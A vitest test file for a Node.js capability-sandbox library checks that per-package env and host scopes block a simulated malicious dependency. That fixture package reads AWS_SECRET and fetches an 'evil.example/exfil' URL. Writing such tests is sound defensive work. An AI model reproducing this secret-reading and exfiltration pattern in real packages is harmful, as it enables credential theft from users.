import { spawnSync } from 'node:child_process'
import { mkdirSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { envAllowed, hostAllowed, parseLock } from '@extodan/capwall-core'

const ROOT = join(import.meta.dirname, '..')
const REGISTER = join(ROOT, 'dist', 'register.mjs')
const TMP = join(ROOT, 'test', 'tmp-scopes')

beforeAll(() => {
  rmSync(TMP, { recursive: true, force: true })
  const pkgDir = join(TMP, 'node_modules', 'scoped-agent')
  mkdirSync(pkgDir, { recursive: true })
  writeFileSync(join(TMP, 'package.json'), JSON.stringify({ name: 't', version: '1.0.0' }))
  writeFileSync(
    join(TMP, 'capabilities.lock'),
    JSON.stringify({
      version: 1,
      defaults: { unrecognized: 'warn' },
      packages: {
        'scoped-agent@1.0.0': {
          capabilities: ['env.read', 'http.request', 'fs.read', 'fs.write'],
          scopes: { env: ['SAFE_VAR'], hosts: ['api.stripe.com'] },
        },
      },
    }),
  )
  writeFileSync(join(pkgDir, 'package.json'), JSON.stringify({ name: 'scoped-agent', version: '1.0.0' }))
  writeFileSync(
    join(pkgDir, 'index.js'),
    `module.exports.run = async (out) => {
      const fs = require('node:fs')
      const log = []
      try { log.push('SAFE=' + process.env.SAFE_VAR) } catch (e) { log.push('SAFE-BLOCKED') }
      try { log.push('SECRET=' + process.env.AWS_SECRET) } catch (e) { log.push('SECRET-BLOCKED') }
      try { await fetch('http://evil.example/exfil'); log.push('FETCH-ALLOWED?!') } catch (e) { log.push(e.code === 'ERR_CAPWALL_CAPABILITY_DENIED' ? 'FETCH-BLOCKED' : 'FETCH-ERR') }
      fs.writeFileSync(out, log.join('|'))
    }`,
  )
  // host-scope check via a controllable server: we assert on the block BEFORE any connection
  writeFileSync(
    join(TMP, 'app.cjs'),
    `require('scoped-agent').run(process.env.OUT_FILE).catch((e) => require('node:fs').appendFileSync(process.env.OUT_FILE, '|FATAL:' + (e.code || e.message).slice(0, 30)))`,
  )
})
afterAll(() => rmSync(TMP, { recursive: true, force: true }))

describe('scoped capability predicates (core)', () => {
  it('parseLock accepts scopes; helpers enforce them', () => {
    const lock = parseLock(
      JSON.stringify({
        version: 1,
        packages: { p: { capabilities: ['env.read'], scopes: { env: ['NODE_ENV'], hosts: ['api.stripe.com'] } } },
      }),
    )
    expect(envAllowed('NODE_ENV', lock.packages.p?.scopes?.env)).toBe(true)
    expect(envAllowed('STRIPE_KEY', lock.packages.p?.scopes?.env)).toBe(false)
    expect(hostAllowed('api.stripe.com', lock.packages.p?.scopes?.hosts)).toBe(true)
    expect(hostAllowed('eu.api.stripe.com', lock.packages.p?.scopes?.hosts)).toBe(true) // subdomain
    expect(hostAllowed('evil.example', lock.packages.p?.scopes?.hosts)).toBe(false)
    expect(envAllowed('ANY', undefined)).toBe(true) // unscoped = allow
  })
})

describe('scoped capability predicates (runtime)', () => {
  it('env scope: allowed var passes, out-of-scope var blocked; fetch host scope enforced', () => {
    const out = join(TMP, 'out.txt')
    const res = spawnSync('node', ['--import', REGISTER, 'app.cjs'], {
      cwd: TMP,
      encoding: 'utf8',
      timeout: 15000,
      env: { PATH: process.env.PATH ?? '', OUT_FILE: out, SAFE_VAR: 'yes', AWS_SECRET: 'leak' },
    })
    const log = require('node:fs').readFileSync(out, 'utf8')
    expect(log).toContain('SAFE=yes')
    expect(log).toContain('SECRET-BLOCKED')
    expect(res.stderr).toContain('outside scoped grant')
    expect(log).toContain('FETCH-BLOCKED') // host outside scopes.hosts
  })
})
